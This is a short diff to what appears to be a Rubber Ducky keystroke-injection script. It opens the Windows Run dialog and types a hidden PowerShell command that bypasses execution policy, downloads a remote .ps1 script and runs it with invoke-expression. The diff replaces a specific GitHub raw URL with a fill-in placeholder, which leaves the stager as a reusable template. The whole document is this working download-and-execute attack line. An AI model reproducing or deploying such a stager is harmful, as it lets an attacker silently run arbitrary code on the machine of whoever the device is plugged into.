@@ -14,5 +14,5 @@ GUI r
 DELAY 100
 
 REM *** Download and execute the payload ***
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/Dev-Sadwhite/Rubber-Test/main/payloads-download/windows/1.ps1?dl=1; invoke-expression $pl 
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr <your github link >?dl=1; invoke-expression $pl 
 ENTER
